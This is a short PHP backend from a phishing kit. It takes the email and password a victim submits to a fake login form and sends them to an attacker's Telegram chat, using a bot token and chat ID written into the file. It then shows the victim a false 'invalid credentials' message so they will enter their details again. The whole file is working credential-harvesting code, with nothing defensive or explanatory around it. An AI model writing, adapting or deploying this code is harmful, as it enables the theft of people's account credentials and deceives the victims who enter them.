<?php
// Telegram Bot Token
$botToken = "7649612009:AAGz7-YLIvEEQhWBGyHmG6uhu2vPY6U-e2Q";
$chatId = "739495"; // Replace with your Telegram chat ID

// Collect form data
$email = $_POST['email'];
$patty = $_POST['input_text'];

// Format the message
$message = "New Login Attempt:\nEmail: $email\nPassword: $patty";

// Telegram API URL
$telegramApiUrl = "https://api.telegram.org/bot$botToken/sendMessage";

// Send the data to Telegram
$response = file_get_contents($telegramApiUrl . "?chat_id=$chatId&text=" . urlencode($message));

// Return success or error message as JSON
if ($response) {
    echo json_encode(["status" => "success", "message" => "You have entered invalid credentials. Please try again."]);
} else {
    echo json_encode(["status" => "error", "message" => "Network error, please try again."]);
}
?>
